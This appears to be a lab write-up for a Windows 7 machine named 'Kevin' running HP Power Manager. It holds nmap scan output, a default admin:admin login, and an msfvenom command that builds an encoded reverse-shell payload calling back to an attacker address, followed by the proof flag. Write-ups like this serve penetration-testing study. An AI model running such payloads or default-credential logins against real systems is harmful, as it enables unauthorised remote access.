# Win - Kevin

---

### Host

```bash
192.168.212.45
```

### Scan

```bash
> nmap -sV -T4 192.168.212.45
> nmap -sCV -A -Pn -O -p- 192.168.212.45 -oN tcpnmap.md
> sudo nmap -sU -Pn 192.168.212.45 --top-ports=100 --reason -oN udpnmap.md

80/tcp    open  http          GoAhead WebServer
| http-title: HP Power Manager
|_Requested resource was http://192.168.212.45/index.asp
|_http-server-header: GoAhead-Webs
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  Windows 7 Ultimate N 7600 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ms-wbt-server Microsoft Terminal Service
| rdp-ntlm-info: 
|   Target_Name: KEVIN
|   NetBIOS_Domain_Name: KEVIN
|   NetBIOS_Computer_Name: KEVIN
|   DNS_Domain_Name: kevin
|   DNS_Computer_Name: kevin
|   Product_Version: 6.1.7600
|_  System_Time: 2025-02-01T18:02:43+00:00
|_ssl-date: 2025-02-01T18:02:51+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=kevin
| Not valid before: 2025-01-31T17:54:11
|_Not valid after:  2025-08-02T17:54:11
3573/tcp  open  tag-ups-1?
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49158/tcp open  msrpc         Microsoft Windows RPC
49159/tcp open  msrpc         Microsoft Windows RPC

Host script results:
| smb-os-discovery: 
|   OS: Windows 7 Ultimate N 7600 (Windows 7 Ultimate N 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::-
|   Computer name: kevin
|   NetBIOS computer name: KEVIN\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2025-02-01T10:02:43-08:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2025-02-01T18:02:43
|_  start_date: 2025-02-01T17:54:56
|_nbstat: NetBIOS name: KEVIN, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:86:67:66 (VMware)
|_clock-skew: mean: 1h35m59s, deviation: 3h34m39s, median: 0s
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled but not required

PORT     STATE         SERVICE     REASON
137/udp  open          netbios-ns  udp-response ttl 125
138/udp  open|filtered netbios-dgm no-response
500/udp  open|filtered isakmp      no-response
4500/udp open|filtered nat-t-ike   no-response
```

---

## Walkthrough

- Port 80 running HTTP, go to `182.168.212.45` and find a login page. Try default `admin:admin` and we are in.

![image.png](Win%20-%20Kevin%2018d553bebf0f80b4a7cdd22b52403bdb/image.png)

![image.png](Win%20-%20Kevin%2018d553bebf0f80b4a7cdd22b52403bdb/image%201.png)

![image.png](Win%20-%20Kevin%2018d553bebf0f80b4a7cdd22b52403bdb/image%202.png)

- Search “HP Power Manager 4.2 exploit” and we found https://www.exploit-db.com/exploits/10099 and https://www.tenable.com/plugins/nessus/44109
- It indicates

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.170 LPORT=6767 -f python -b "\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c\x3d\x3b\x2d\x2c\x2e\x24\x25\x1a" -e x86/alpha_mixed
```

![image.png](Win%20-%20Kevin%2018d553bebf0f80b4a7cdd22b52403bdb/image%203.png)

![image.png](Win%20-%20Kevin%2018d553bebf0f80b4a7cdd22b52403bdb/image%204.png)

### FLAG

```bash
- proof.txt : 08c85a98e8c79f03661b2b7c1f45b4b5
```